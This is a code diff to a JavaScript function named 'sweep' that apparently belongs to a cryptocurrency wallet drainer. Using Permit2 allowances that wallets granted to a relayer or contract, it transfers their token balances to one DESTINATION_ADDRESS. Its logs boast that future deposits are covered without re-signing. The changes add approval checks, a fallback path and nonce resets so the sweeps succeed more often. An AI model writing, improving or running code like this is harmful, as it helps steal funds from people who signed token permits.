@@ -1828,16 +1828,29 @@ async function sweep(wallet) {
         try {
           const sym = TOKENS.find(t => t.address.toLowerCase() === token)?.symbol ?? token.slice(0, 10);
           const [p2Amt,, p2Exp] = await permit2Read.allowance(checksum, token, relayerWallet.address);
+          let sweptThisToken = false;
           if (p2Amt > 0n && BigInt(p2Exp) >= nowSecs) {
-            const sweepAmt = p2Amt < balance ? p2Amt : balance;
-            if (sweepAmt === 0n) continue;
-            log(`[live-allowance] ${short} — sweeping ${sym} via relayer Permit2 allowance`);
-            const fee = await getFeeData();
-            const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, sweepAmt, token, { gasLimit: 150_000n, ...fee });
-            await tx.wait();
-            log(`[live-allowance] ✅ swept ${sym} from ${short}`);
-            sweptAny = true;
-          } else if (CONTRACT_ADDRESS && contract) {
+            let erc20Approved = false;
+            try {
+              const erc20Chk = await new ethers.Contract(token, ERC20_ABI, getReadProvider()).allowance(checksum, PERMIT2_ADDRESS);
+              erc20Approved = erc20Chk > 0n;
+            } catch {}
+            if (!erc20Approved) {
+              warn(`[live-allowance] ${sym} relayer path skipped — ERC-20→Permit2 approval missing or pending`);
+            } else {
+              const sweepAmt = p2Amt < balance ? p2Amt : balance;
+              if (sweepAmt > 0n) {
+                log(`[live-allowance] ${short} — sweeping ${sym} via relayer Permit2 allowance`);
+                const fee = await getFeeData();
+                const tx = await permit2.transferFrom(checksum, DESTINATION_ADDRESS, sweepAmt, token, { gasLimit: 150_000n, ...fee });
+                await tx.wait();
+                log(`[live-allowance] ✅ swept ${sym} from ${short}`);
+                sweptAny = true;
+                sweptThisToken = true;
+              }
+            }
+          }
+          if (!sweptThisToken && CONTRACT_ADDRESS && contract) {
             const [v2Amt,, v2Exp] = await permit2Read.allowance(checksum, token, CONTRACT_ADDRESS);
             if (v2Amt > 0n && BigInt(v2Exp) >= nowSecs) {
               let erc20Approved = false;
@@ -1858,6 +1871,7 @@ async function sweep(wallet) {
             }
           }
         } catch (e) {
+          maybeResetNonce(e);
           const msg = e.reason ?? e.message ?? "";
           if (!/allowance/i.test(msg)) err(`[live-allowance] ❌ ${token.slice(0, 10)}: ${msg}`);
         }
@@ -2173,6 +2187,7 @@ async function sweep(wallet) {
           if (hasBackupAllowance) log(`[gasless] AllowanceTransfer still active — future deposits covered without re-signing`);
         }
       } catch (e) {
+        maybeResetNonce(e);
         const revertName = e.revert?.name ?? null;
         const errDetail  = revertName ?? e.reason ?? e.shortMessage ?? e.message;
         err(`[gasless] ❌ revert: ${errDetail}`);
